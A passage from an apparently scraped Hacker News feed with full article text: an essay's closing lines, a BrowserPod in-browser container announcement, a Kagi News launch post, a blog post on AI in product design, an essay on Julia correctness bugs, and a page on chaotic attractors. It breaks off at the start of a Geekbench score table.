    &lt;p&gt;In other words, the meta ruins things for everyone. To hide in abstractions is to dodge the reality of your choices. These tactics may get you profit, but you sacrifice benefit. The climb may feel like progress, but at the end you’ll find yourself at the top of a mountain of lemons, perhaps not of your own making, but almost certainly of your own doing.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://frankchimero.com/blog/2025/selling-lemons/"/><published>2025-09-30T14:14:28+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45426099</id><title>BrowserPod: In-browser full-stack environments for IDEs and Agents via WASM</title><updated>2025-09-30T17:09:33.950036+00:00</updated><content>&lt;doc fingerprint="d3380c7ccb3ed58"&gt;
  &lt;main&gt;
    &lt;p&gt;We’re excited to introduce BrowserPod a WebAssembly-based, in-browser container technology that runs full-stack development environments across multiple languages.&lt;/p&gt;
    &lt;p&gt;BrowserPod is a generalised, more powerful alternative to WebContainers, with advanced networking capabilities and flexible multi-runtime support. Containers, called Pods, run completely client-side. At their core there is a flexible WebAssembly-based engine that can execute multiple programming languages.&lt;/p&gt;
    &lt;p&gt;Each Pod can:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Run multiple processes or services in parallel, with real concurrency powered by WebWorkers&lt;/item&gt;
      &lt;item&gt;Access a scalable block-based filesystem with privacy-preserving browser-local persistence.&lt;/item&gt;
      &lt;item&gt;Expose virtualized HTTP / REST services to the internet via Portals&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Pods are fast booting, since no provision of server-side resources is required. Moreover, multiple Pods can run in each browser tab, enabling complex deployments.&lt;/p&gt;
    &lt;p&gt;BrowserPod is conceptually similar to WebContainers, but is designed from the ground up to be language-agnostic, to support inbound networking, and to be integrated within the Leaning Technologies ecosystem.&lt;/p&gt;
    &lt;p&gt;BrowserPod will be released in late November, with an initial focus on Node.js environments and a well defined path to support additional stacks, with Python and Ruby as immediate priorities.&lt;/p&gt;
    &lt;p&gt;Further capabilities will become available later by integrating BrowserPod with CheerpX, our x86-to-WebAssembly virtualization engine. In particular, we plan to support React Native environments in 2026.&lt;/p&gt;
    &lt;head rend="h2"&gt;What is BrowserPod for?&lt;/head&gt;
    &lt;p&gt;BrowserPod is designed to run complete development environments in the browser, without installing local helper applications or dedicated server-side resources.&lt;/p&gt;
    &lt;p&gt;A typical use case of BrowserPod, exemplified by this demo, would be a browser-based IDE that can run a preview server, for example via &lt;code&gt;npm run dev&lt;/code&gt;. The preview server runs fully in the browser, with each update to files being reflected in the virtualized environment. As files are updated the normal Hot Module Replacement triggers, updating the preview.&lt;/p&gt;
    &lt;p&gt;The application preview is not just available in the same browser session, but is exposed to the internet via a Portal, a seamless solution to allow direct public access to any HTTP service running inside a Pod.&lt;/p&gt;
    &lt;p&gt;Portals make it possible to achieve real cross-device testing of applications and even pre-release sharing of test URLs with external users, including early adopters, stakeholders and clients.&lt;/p&gt;
    &lt;p&gt;BrowserPod’s initial focus will be on Node.js environments, which are supported via a complete build of Node.js, compiled to WebAssembly and virtualized in the browser. BrowserPod will support multiple versioned runtimes, with Node.js 22 being included in the first release.&lt;/p&gt;
    &lt;p&gt;This high-fidelity approach ensures that applications developed in BrowserPod containers will behave the same when migrated to production, making it possible to build real-world applications in Pods, not just prototypes.&lt;/p&gt;
    &lt;p&gt;BrowserPod is a great fit for web-based IDEs, educational environments, interactive documentation websites and AI coding Agents.&lt;/p&gt;
    &lt;head rend="h2"&gt;How does BrowserPod work?&lt;/head&gt;
    &lt;p&gt;BrowserPod builds on our years long experience in delivering high performance in-browser virtualization via WebVM. WebVM is powered by CheerpX, our x86-to-WebAssembly virtualization engine, and it has been the most popular tool we have released so far, with 15k+ stars on GitHub.&lt;/p&gt;
    &lt;p&gt;To make BrowserPod possible we have rearchitectured CheerpX to separate its two main components: the x86-to-WebAssembly JIT compiler engine, and the Linux system call emulation layer. This emulation layer, that we are calling CheerpOS internally, is now shared across CheerpX and BrowserPod and, down the line, it will become a foundation layer across all our products.&lt;/p&gt;
    &lt;p&gt;CheerpOS is effectively a WebAssembly kernel that allows unmodified C/C++ code for Linux to run in the browser. In the context of BrowserPod it is used to provide a unified view of filesystem and access to networking across the multiple processes running in a Pod.&lt;/p&gt;
    &lt;p&gt;On top of this kernel layer, we compile the C++ source code of Node.js, with minimal changes, to a combination of WebAssembly and JavaScript. The use of JavaScript is specific to Node.js and provides the required shortcut to run JavaScript payloads natively in the browser itself, which is critical for high performance execution of Node.js environments.&lt;/p&gt;
    &lt;p&gt;Other stacks, such as Python and Ruby on Rails, will instead run as pure WebAssembly applications on top of the CheerpOS kernel.&lt;/p&gt;
    &lt;head rend="h2"&gt;Licensing&lt;/head&gt;
    &lt;p&gt;BrowserPod will come with a generous free license with attribution, available for non-commercial users and technical evaluations.&lt;/p&gt;
    &lt;p&gt;A transparent pay-as-you-go model will be available for any use and purpose, including companies working on AI codegen tools. Pricing will be announced at release time and it will be very affordable to maximize the adoption of this technology, with discounts available for educational and non-profit use.&lt;/p&gt;
    &lt;p&gt;An Enterprise license will also be available for self-hosting and commercial support.&lt;/p&gt;
    &lt;head rend="h2"&gt;General Availability&lt;/head&gt;
    &lt;p&gt;The initial release of BrowserPod will become generally available in late November - early December 2025, with support for Node.js 22.&lt;/p&gt;
    &lt;p&gt;Over the course of the following year, we have planned several additional releases, including support for multiple Node.js versions, support for Python and Ruby on Rails, and eventually support for React Native environments.&lt;/p&gt;
    &lt;p&gt;To receive up-to-date information on BrowserPod, make sure to register on our website. We plan to extend an early adopter program to a selected subset of registered users and organizations.&lt;/p&gt;
    &lt;p&gt;For more information on all our products and technologies, please join our Discord. Most members of the development team are active there and ready to answer any question you might have. You can also follow us on X and LinkedIn for updates.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusions&lt;/head&gt;
    &lt;p&gt;BrowserPod is currently in the final stages of development, and we are thrilled to see what the community will build on top of this technology when it is released in late November.&lt;/p&gt;
    &lt;p&gt;Leaning Technologies mission statement is “Run anything on the browser”, and BrowserPod is an important milestone along this journey. It will also not be the last and we have great ambitions for our ecosystem as we migrate to the unified CheerpOS foundational layer. Stay tuned!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://labs.leaningtech.com/blog/browserpod-annoucement"/><published>2025-09-30T14:42:18+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45426490</id><title>Kagi News</title><updated>2025-09-30T17:09:33.747917+00:00</updated><content>&lt;doc fingerprint="b500b3a787eb238f"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing Kagi News&lt;/head&gt;
    &lt;p&gt;A comprehensive daily press review with global news. Fully private, with sources openly curated by our community.&lt;/p&gt;
    &lt;p&gt;News is broken. We all know it, but we’ve somehow accepted it as inevitable. The endless notifications. The clickbait headlines designed to trigger rather than inform, driven by relentless ad monetization. The exhausting cycle of checking multiple apps throughout the day, only to feel more anxious and less informed than when we started. This isn’t what news was supposed to be. We can do better, and create what news should have been all along: pure, essential information that respects your intelligence and time.&lt;/p&gt;
    &lt;head rend="h2"&gt;Our approach: Signal over noise&lt;/head&gt;
    &lt;p&gt;Kagi News operates on a simple principle: understanding the world requires hearing from the world. Every day, our system reads thousands of community curated RSS feeds from publications across different viewpoints and perspectives. We then distill this massive information into one comprehensive daily briefing, while clearly citing sources.&lt;/p&gt;
    &lt;p&gt;We strive for diversity and transparency of resources and welcome your contributions to widen perspectives. This multi-source approach helps reveal the full picture beyond any single viewpoint.&lt;/p&gt;
    &lt;head rend="h2"&gt;Design principles that put readers first&lt;/head&gt;
    &lt;p&gt;One daily update: We publish once per day around noon UTC, creating a natural endpoint to news consumption. This is a deliberate design choice that turns news from an endless habit into a contained ritual.&lt;/p&gt;
    &lt;p&gt;Five-minute complete understanding: Our briefings cover everything important in just five minutes. No endless scrolling. No attention hijacking. You read, understand, and move on with your day.&lt;/p&gt;
    &lt;p&gt;Diversity over echo chambers: Rather than personalizing feeds to match existing preferences, we expose readers to the full spectrum of global perspectives. This approach breaks down information silos instead of reinforcing them.&lt;/p&gt;
    &lt;p&gt;Privacy by design: Your reading habits belong to you. We don’t track, profile, or monetize your attention. You remain the customer and not the product.&lt;/p&gt;
    &lt;p&gt;Community-driven sources: Our news sources are open source and community-curated through our public GitHub repository. Anyone can propose additions, flag problems, or suggest improvements.&lt;/p&gt;
    &lt;p&gt;Customizable: In your settings, you can select and reorder categories to match your interests and priorities. You can also adjust the number of stories shown, as well as dragging to re-order various sections, so that your briefing is focused on the depth and topics that matter most to you.&lt;/p&gt;
    &lt;p&gt;News in your language: You can choose your preferred interface and content language. News stories are generated in their original source language, and then translated using Kagi Translate. The default mode shows regional stories in their original language without translation, and all other ones in your browser’s language.&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical implementation that respects publishers&lt;/head&gt;
    &lt;p&gt;We don’t scrape content from websites. Instead, we use publicly available RSS feeds that publishers choose to provide. Publishers decide what content appears in their feeds; some include full articles, others only titles or summaries. We respect those choices completely. We’re working within the ecosystem publishers have created rather than circumventing their intentions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Ready to experience news differently?&lt;/head&gt;
    &lt;p&gt;If you’re tired of news that makes you feel worse about the world while teaching you less about it, we invite you to try a different approach with Kagi News, so download it today:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.kagi.com/kagi-news"/><published>2025-09-30T15:09:00+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45426673</id><title>AI will happily design the wrong thing for you</title><updated>2025-09-30T17:09:33.484192+00:00</updated><content>&lt;doc fingerprint="21de58151a65acb0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;AI will happily design the wrong thing for you&lt;/head&gt;
    &lt;p&gt;I need to clear something up about my book, “Products People Actually Want.” When I write about how “anyone can build anything” now, some people assume I’m anti-AI. That I think these tools are ruining design or product development.&lt;/p&gt;
    &lt;p&gt;That’s not it at all.&lt;/p&gt;
    &lt;p&gt;AI tools are incredible leverage. They make me think faster, broader, and help me produce better work. But like any creative partner or colleague, this doesn’t happen out of the gate. I’ve spent hours—days—training my AI on how we write at Summer Health so the tone is right. I’ve taught it our business model. I tweak its suggestions to better match the experience we want to build.&lt;/p&gt;
    &lt;p&gt;The problem isn’t that AI exists. The problem is how most people use it.&lt;/p&gt;
    &lt;head rend="h2"&gt;The real issue with “anyone can build anything”&lt;/head&gt;
    &lt;p&gt;My book focuses on a specific problem: people building things without knowing if anyone actually needs them. When the barrier to building drops to zero, we get flooded with products that work fine but solve problems that don’t exist.&lt;/p&gt;
    &lt;p&gt;But there’s a second issue too. While AI can help you get started quickly, it won’t build something ready for mass market. Users’ expectations for polish and detail are much higher than what AI produces by default. You can spot AI-generated work from a mile away because it lacks the intentional decisions that make products feel right.&lt;/p&gt;
    &lt;p&gt;The combination is brutal: people building the wrong things, and building them poorly.&lt;/p&gt;
    &lt;p&gt;Just last week, we saw a perfect example. Food influencer Molly Baz discovered that Shopify was selling a website template featuring what she called “a sicko AI version of me.” The image—a woman in a red sweatshirt eating an onion ring in a butter-yellow kitchen—looked almost identical to her cookbook cover.&lt;/p&gt;
    &lt;p&gt;This isn’t really an AI problem, it’s a laziness problem that AI makes more tempting. What used to be someone using an image without permission now gets dressed up as “AI-generated content.” The ironic part? Creating something unique with AI tools is actually easier than trying to replicate someone else’s work. The tools are there. The capability is there. The only thing missing is the intention to actually create something new.&lt;/p&gt;
    &lt;head rend="h2"&gt;How I actually use AI&lt;/head&gt;
    &lt;p&gt;I use AI tools extensively, but strategically:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Granola for transcribing user research sessions&lt;/item&gt;
      &lt;item&gt;Visual Electric for images that are impossible to find in stock libraries (like families that aren’t white middle class)&lt;/item&gt;
      &lt;item&gt;ChatGPT as a sparring partner and for writing better copy&lt;/item&gt;
      &lt;item&gt;Cursor for building websites and prototypes&lt;/item&gt;
      &lt;item&gt;A custom copywriter agent trained on our brand voice&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;But here’s what I don’t do: I don’t use AI to replace thinking. I saw a tool recently that listens to user interviews and suggests follow-up questions. Tools like this make designers lazier, not better. You need genuine curiosity. You need to understand what you’re looking for before you can synthesize anything meaningful.&lt;/p&gt;
    &lt;p&gt;What AI is great at is helping you process large sets of information and pull out themes. But if you don’t understand your users and what they’re struggling with first, it’s impossible to prompt any AI tool for a real solution.&lt;/p&gt;
    &lt;p&gt;Here’s the thing about AI tools: if you don’t know what your customers want, if you as a designer don’t have a view on how to package it, AI will happily make all of that up for you. That just doesn’t mean it’s the right thing. AI fills in the blanks confidently, but those blanks are exactly where the real design work should happen.&lt;/p&gt;
    &lt;head rend="h2"&gt;The skills that actually matter&lt;/head&gt;
    &lt;p&gt;The divide for engineers is easier to see: tools can help them code much faster, but it’s worthless if they can’t understand the generated code.&lt;/p&gt;
    &lt;p&gt;For designers, the key skill going forward will be taste and curation. Understanding what you want to prompt before diving in. Knowing good work from generic work. Being able to refine and iterate until something feels intentional rather than automated.&lt;/p&gt;
    &lt;p&gt;I think designers who resist AI entirely will find themselves without jobs in the next five years. When you can use AI to speed up tedious tasks, what’s the reason for doing them manually?&lt;/p&gt;
    &lt;p&gt;But designers who treat AI like a magic button will struggle too. The ones who thrive will use AI as leverage—to think better, work faster, and explore more possibilities than they could alone.&lt;/p&gt;
    &lt;head rend="h2"&gt;AI amplifies everything&lt;/head&gt;
    &lt;p&gt;Here’s how I see it: AI is leverage. It amplifies whatever you bring to it.&lt;/p&gt;
    &lt;p&gt;If you understand your users deeply, AI helps you explore more solutions. If you have good taste, AI helps you iterate faster. If you can communicate clearly, AI helps you refine that communication.&lt;/p&gt;
    &lt;p&gt;But if you don’t understand the problem you’re solving, AI just helps you build the wrong thing more efficiently. If you have poor judgment, AI amplifies that too.&lt;/p&gt;
    &lt;p&gt;The future belongs to people who combine human insight with AI capability. Not people who think they can skip the human part.&lt;/p&gt;
    &lt;p&gt;My book isn’t the antidote to AI. It’s about developing the judgment to use any tool—AI included—in service of building things people actually want. The better you understand users and business fundamentals, the better your AI-assisted work becomes.&lt;/p&gt;
    &lt;p&gt;AI didn’t create the problem of people building useless products. It just made it easier to build more of them, faster. The solution isn’t to avoid the tools. It’s to get better at the human parts of the job that the tools can’t do for you.&lt;/p&gt;
    &lt;p&gt;Yet.&lt;/p&gt;
    &lt;p&gt;My book Products People Actually Want is out now.&lt;/p&gt;
    &lt;head rend="h2"&gt;Did you enjoy this article?&lt;/head&gt;
    &lt;p&gt;Join 3,000+ designers, developers, and product people who get my best ideas about design each month.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.antonsten.com/articles/ai-will-happily-design-the-wrong-thing-for-you/"/><published>2025-09-30T15:20:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427021</id><title>Correctness and composability bugs in the Julia ecosystem (2022)</title><updated>2025-09-30T17:09:33.208796+00:00</updated><content>&lt;doc fingerprint="3cc1939b22f38bfe"&gt;
  &lt;main&gt;&lt;p&gt;For many years I used the Julia programming language for transforming, cleaning, analyzing, and visualizing data, doing statistics, and performing simulations.&lt;/p&gt;&lt;p&gt;I published a handful of open-source packages for things like signed distance fields, nearest-neighbor search, and Turing patterns (among others), made visual explanations of Julia concepts like broadcasting and arrays, and used Julia to make the generative art on my business cards.&lt;/p&gt;&lt;p&gt;I stopped using Julia a while ago, but it still sometimes comes up. When people ask, I tell them that I can no longer recommend it. I thought I’d write up my reasons why.&lt;/p&gt;&lt;p&gt;My conclusion after using Julia for many years is that there are too many correctness and composability bugs throughout the ecosystem to justify using it in just about any context where correctness matters.&lt;/p&gt;&lt;p&gt;In my experience, Julia and its packages have the highest rate of serious correctness bugs of any programming system I’ve used, and I started programming with Visual Basic 6 in the mid-2000s.&lt;/p&gt;&lt;p&gt;It might be useful to give some concrete examples.&lt;/p&gt;&lt;p&gt;Here are some correctness issues I filed:&lt;/p&gt;&lt;p&gt;Here are comparable issues filed by others:&lt;/p&gt;&lt;code&gt;copyto!&lt;/code&gt; methods don’t check for aliasing&lt;p&gt;I would hit bugs of this severity often enough to make me question the correctness of any moderately complex computation in Julia.&lt;/p&gt;&lt;p&gt;This was particularly true when trying a novel combination of packages or functions — composing together functionality from multiple sources was a significant source of bugs.&lt;/p&gt;&lt;p&gt;Sometimes the problems would be with packages that don’t compose together, and other times an unexpected combination of Julia’s features within a single package would unexpectedly fail.&lt;/p&gt;&lt;p&gt;For example, I found that the Euclidean distance from the Distances package does not work with Unitful vectors. Others discovered that Julia’s function to run external commands doesn’t work with substrings. Still others found that Julia’s support for missing values breaks matrix multiplication in some cases. And that the standard library’s &lt;code&gt;@distributed&lt;/code&gt; macro didn’t work with OffsetArrays.&lt;/p&gt;&lt;p&gt;OffsetArrays in particular proved to be a strong source of correctness bugs. The package provides an array type that leverages Julia’s flexible custom indices feature to create arrays whose indices don’t have to start at zero or one.&lt;/p&gt;&lt;p&gt;Using them would often result in out-of-bounds memory accesses, just like those one might encounter in C or C++. This would lead to segfaults if you were lucky, or, if you weren’t, to results that were quietly wrong. I once found a bug in core Julia that could lead to out-of-bounds memory accesses even when both the user and library authors wrote correct code.&lt;/p&gt;&lt;p&gt;I filed a number of indexing-related issues with the JuliaStats organization, which stewards statistics packages like Distributions, which 945 packages depend on, and StatsBase, which 1,660 packages depend on. Here are some of them:&lt;/p&gt;&lt;p&gt;The majority of sampling methods are unsafe and incorrect in the presence of offset axes&lt;/p&gt;&lt;p&gt;Fitting a DiscreteUniform distribution can silently return an incorrect answer&lt;/p&gt;&lt;p&gt;Incorrect uses of @inbounds cause miscalculation of statistics&lt;/p&gt;&lt;p&gt;Showing a Weights vector wrapping an offset array accesses out-of-bounds memory&lt;/p&gt;&lt;p&gt;The root cause behind these issues was not the indexing alone but its use together with another Julia feature, &lt;code&gt;@inbounds&lt;/code&gt;, which permits Julia to remove bounds checks from array accesses.&lt;/p&gt;&lt;p&gt;For example:&lt;/p&gt;&lt;code&gt;function sum(A::AbstractArray)
    r = zero(eltype(A))
    for i in 1:length(A)
        @inbounds r += A[i] # ← 🌶
    end
    return r
end
&lt;/code&gt;

&lt;p&gt;The code above iterates &lt;code&gt;i&lt;/code&gt; from 1 to the length of the array. If you pass it an array with an unusual index range, it will access out-of-bounds memory: the array access was annotated with &lt;code&gt;@inbounds&lt;/code&gt;, which removed the bounds check.&lt;/p&gt;&lt;p&gt;The example above shows how to use &lt;code&gt;@inbounds&lt;/code&gt; incorrectly. However, for years it was also the official example of how to use &lt;code&gt;@inbounds&lt;/code&gt; correctly. The example was situated directly above a warning explaining why it was incorrect:&lt;/p&gt;&lt;p&gt;That issue is now fixed, but it is worrying that &lt;code&gt;@inbounds&lt;/code&gt; can be so easily misused, causing silent data corruption and incorrect mathematical results.&lt;/p&gt;&lt;p&gt;In my experience, issues like these were not confined to the mathematical parts of the Julia ecosystem.&lt;/p&gt;&lt;p&gt;I encountered library bugs while trying to accomplish mundane tasks like encoding JSON, issuing HTTP requests, using Arrow files together with DataFrames, and editing Julia code with Pluto, Julia’s reactive notebook environment.&lt;/p&gt;&lt;p&gt;When I became curious if my experience was representative, a number of Julia users privately shared similar stories. Recently, public accounts of comparable experiences have begun to surface.&lt;/p&gt;&lt;p&gt;For example, in this post Patrick Kidger describes his attempt to use Julia for machine learning research:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;It’s pretty common to see posts on the Julia Discourse saying “XYZ library doesn’t work”, followed by a reply from one of the library maintainers stating something like “This is an upstream bug in the new version a.b.c of the ABC library, which XYZ depends upon. We’ll get a fix pushed ASAP.”&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Here’s Patrick’s experience tracking down a correctness bug (emphasis mine):&lt;/p&gt;&lt;quote&gt;&lt;p&gt;I remember all too un-fondly a time in which one of my Julia models was failing to train. I spent multiple months on-and-off trying to get it working, trying every trick I could think of.&lt;/p&gt;&lt;p&gt;Eventually – eventually! – I found the error: Julia/Flux/Zygote was returning incorrect gradients. After having spent so much energy wrestling with points 1 and 2 above, this was the point where I simply gave up. Two hours of development work later, I had the model successfully training… in PyTorch.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;In a discussion about the post others responded that they, too, had similar experiences.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Like @patrick-kidger, I have been bit by incorrect gradient bugs in Zygote/ReverseDiff.jl. This cost me weeks of my life and has thoroughly shaken my confidence in the entire Julia AD landscape. [...] In all my years of working with PyTorch/TF/JAX I have not once encountered an incorrect gradient bug.&lt;/p&gt;&lt;/quote&gt;&lt;quote&gt;&lt;p&gt;Since I started working with Julia, I’ve had two bugs with Zygote which have slowed my work by several months. On a positive note, this has forced me to plunge into the code and learn a lot about the libraries I’m using. But I’m finding myself in a situation where this is becoming too much, and I need to spend a lot of time debugging code instead of doing climate research.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Given Julia’s extreme generality it is not obvious to me that the correctness problems can be solved. Julia has no formal notion of interfaces, generic functions tend to leave their semantics unspecified in edge cases, and the nature of many common implicit interfaces has not been made precise (for example, there is no agreement in the Julia community on what a number is).&lt;/p&gt;&lt;p&gt;The Julia community is full of capable and talented people who are generous with their time, work, and expertise. But systemic problems like this can rarely be solved from the bottom up, and my sense is that the project leadership does not agree that there is a serious correctness problem. They accept the existence of individual isolated issues, but not the pattern that those issues imply.&lt;/p&gt;&lt;p&gt;At a time when Julia’s machine learning ecosystem was even less mature, for example, a co-founder of the language spoke enthusiastically about using Julia in production for self-driving cars:&lt;/p&gt;&lt;p&gt;And while it’s possible that attitudes have shifted since I was an active member, the following quote from another co-founder, also made around the same time, serves as a good illustration of the perception gap (emphasis mine):&lt;/p&gt;&lt;quote&gt;&lt;p&gt;I think the top-level take away here is not that Julia is a great language (although it is) and that they should use it for all the things (although that’s not the worst idea), but that its design has hit on something that has made a major step forwards in terms of our ability to achieve code reuse. It is actually the case in Julia that you can take generic algorithms that were written by one person and custom types that were written by other people and just use them together efficiently and effectively. This majorly raises the table stakes for code reuse in programming languages. Language designers should not copy all the features of Julia, but they should at the very least understand why this works so well, and be able to accomplish this level of code reuse in future designs.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Whenever a post critiquing Julia makes the rounds, people from the community are often quick to respond that, while there have historically been some legitimate issues, things have improved substantially and most of the issues are now fixed.&lt;/p&gt;&lt;p&gt;For example:&lt;/p&gt;&lt;p&gt;These responses often look reasonable in their narrow contexts, but the net effect is that people’s legitimate experiences feel diminished or downplayed, and the deeper issues go unacknowledged and unaddressed.&lt;/p&gt;&lt;p&gt;My experience with the language and community over the past ten years strongly suggests that, at least in terms of basic correctness, Julia is not currently reliable or on the path to becoming reliable. For the majority of use cases the Julia team wants to service, the risks are simply not worth the rewards.&lt;/p&gt;&lt;p&gt;Ten years ago, Julia was introduced to the world with an inspiring and ambitious set of goals. I still believe that they can, one day, be achieved—but not without revisiting and revising the patterns that brought the project to the state it is in today.&lt;/p&gt;&lt;p&gt;Thanks to Mitha Nandagopalan, Ben Cartwright-Cox, Imran Qureshi, Dan Luu, Elad Bogomolny, Zora Killpack, Ben Kuhn, and Yuriy Rusko for discussions and comments on earlier drafts of this post.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://yuri.is/not-julia/"/><published>2025-09-30T15:46:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427059</id><title>Visualizations of Random Attractors Found Using Lyapunov Exponents</title><updated>2025-09-30T17:09:33.046377+00:00</updated><content>&lt;doc fingerprint="2992588605812842"&gt;
  &lt;main&gt;
    &lt;cell&gt;&lt;head rend="h1"&gt; Random Attractors&lt;lb/&gt; Found using Lyapunov Exponents &lt;/head&gt; Written by Paul Bourke&lt;lb/&gt; October 2001&lt;p&gt; Contribution by Philip Ham: attractor.basic&lt;lb/&gt; and Python implementation by Johan Bichel Lindegaard.&lt;/p&gt;&lt;p&gt; This document is "littered" with a selection of attractors found using the techniques described. &lt;/p&gt;&lt;p&gt; In order for a system to exhibit chaotic behaviour it must be non linear. Representing chaotic systems on a screen or on paper leads one to considering a two dimensional system, an equation in two variables. One possible two dimensional non-linear system, the one used here, is the quadratic map defined as follows. &lt;/p&gt; xn+1 = a0 + a1 xn + a2 xn2 + a3 xn yn + a4 yn + a5 yn2 &lt;lb/&gt; yn+1 = b0 + b1 xn + b2 xn2 + b3 xn yn + b4 yn + b5 yn2 &lt;p&gt; The standard measure for determining whether or not a system is chaotic is the Lyapunov exponent, normally represented by the lambda symbol. Consider two close points at step n, xn and xn+dxn. At the next time step they will have diverged, namely to xn+1 and xn+1+dxn+1. It is this average rate of divergence (or convergence) that the Lyapunov exponent captures. Another way to think about the Lyapunov exponent is as the rate at which information about the initial conditions is lost. &lt;/p&gt;&lt;p&gt; There are as many Lyapunov exponents as dimensions of the phase space. Considering a region (circle, sphere, hypersphere, etc) in phase space then at a later time all trajectories in this region form an n-dimensional elliptical region. The Lyapunov exponent can be calculated for each dimension. When talking about a single exponent one is normally referring to the largest, this convention will be assumed from now onwards. &lt;/p&gt;&lt;p&gt; If the Lyapunov exponent is positive then the system is chaotic and unstable. Nearby points will diverge irrespective of how close they are. Although there is no order the system is still deterministic! The magnitude of the Lyapunov exponent is a measure of the sensitivity to initial conditions, the primary characteristic of a chaotic system. &lt;/p&gt;&lt;p&gt; If the Lyapunov exponent is less than zero then the system attracts to a fixed point or stable periodic orbit. These systems are non conservative (dissipative). The absolute value of the exponent indicates the degree of stability. &lt;/p&gt;&lt;p&gt; If the Lyapunov exponent is zero then the system is neutrally stable, such systems are conservative and in a steady state mode. &lt;/p&gt;&lt;p&gt; To create the chaotic attractors shown on this page each parameter an and bn in the quadratic equation above is chosen at random between some bounds (+- 2 say). The system so specified is generated by iterating for some suitably large number of time steps (eg; 100000) steps during which time the image is created and the Lyapunov exponent computed. Note that the first few (1000) timesteps are ignored to allow the system to settle into its "natural" behaviour. If the Lyapunov exponent indicates chaos then the image is saved and the program moves on to the next random parameter set. &lt;/p&gt;&lt;p&gt; There are a number of ways the series may behave. &lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt; It may converge to a single point, called a fixed point. These can be detected by comparing the distances between successive points. For numerical reasons this is safer than relying on the Lyapunov exponent which may be infinite (logarithm of 0)&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt; It may diverge to infinity, for the range (+- 2) used here for each parameter this is the most likely event. These are also easy to detect and discard, indeed they need to be in order to avoid numerical errors.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt; It will form a periodic orbit, these are identified by their negative Lyapunov exponent. &lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt; It will exhibit chaos, filling in some region of the plane. These are the solutions that "look good" and the ones we wish to identify with the Lyapunov exponent. &lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt; It should be noted that there may be visually appealing structures that are not chaotic attractors. That is, the resulting image is different for different initial conditions and there is no single basin of attraction. It's interesting how we "see" 3 dimensional structures in these essentially 2 dimensional systems. &lt;/p&gt;&lt;p&gt; The software used to create these images is given here: gen.c. On average 98% of the random selections of (an, bn) result in an infinite series. This is so common because of the range (-2 &amp;lt;= a,b &amp;lt;= 2) for each of the parameters a and b, the number of infinite cases will reduce greatly with a smaller range. About 1% were point attractors, and about 0.5% were periodic basins of attraction. &lt;/p&gt;&lt;table&gt;&lt;row&gt;&lt;cell&gt;&lt;p&gt; Image courtesy of Robert McGregor, Space Coast of Florida. Launch trail perhaps 30 minutes after the shuttle launch (June 2007) dispersing from a column into a smoke ring due to some unusual air currents in the upper atmosphere. &lt;/p&gt;&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt; References&lt;/p&gt;&lt;p&gt; Berge, P., Pomeau, Y., Vidal, C.,&lt;lb/&gt; Order Within Chaos, Wiley, New York, 1984. &lt;/p&gt;&lt;p&gt; Crutchfield, J., Farmer, J., Packard, N.&lt;lb/&gt; Chaos, Scientific American, 1986, 255, 46-47 &lt;/p&gt;&lt;p&gt; Das, A., Das, Pritha, Roy, A&lt;lb/&gt; Applicability of Lyapunov Exponent in EEG data analysis. Complexity International, draft manuscript. &lt;/p&gt;&lt;p&gt; Devaney, R.&lt;lb/&gt; An Introduction to Chaotic Dynamical Systems, Addison-Wesley, 1989 &lt;/p&gt;&lt;p&gt; Feigenbaum, M.,&lt;lb/&gt; Universal behaviour in Nonlinear Systems, Los Alamos Science, 1981 &lt;/p&gt;&lt;p&gt; Peitgen, H., Jurgens, H., Saupe, D&lt;lb/&gt; Lyapunov exponents and chaotic attractors in Chaos and fractals - new frontiers of science. Springer, new York, 1992. &lt;/p&gt;&lt;p&gt; Contributions by Dmytry Lavrov &lt;/p&gt;&lt;/cell&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://paulbourke.net/fractals/lyapunov/"/><published>2025-09-30T15:50:14+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427197</id><title>Leaked Apple M5 9 core Geekbench scores</title><updated>2025-09-30T17:09:32.851142+00:00</updated><content>&lt;doc fingerprint="4fa0627d6e0cbd81"&gt;
  &lt;main&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Upload Date&lt;/cell&gt;
        &lt;cell&gt;September 30 2025 12:36 PM&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Views&lt;/cell&gt;
        &lt;cell&gt;2761&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
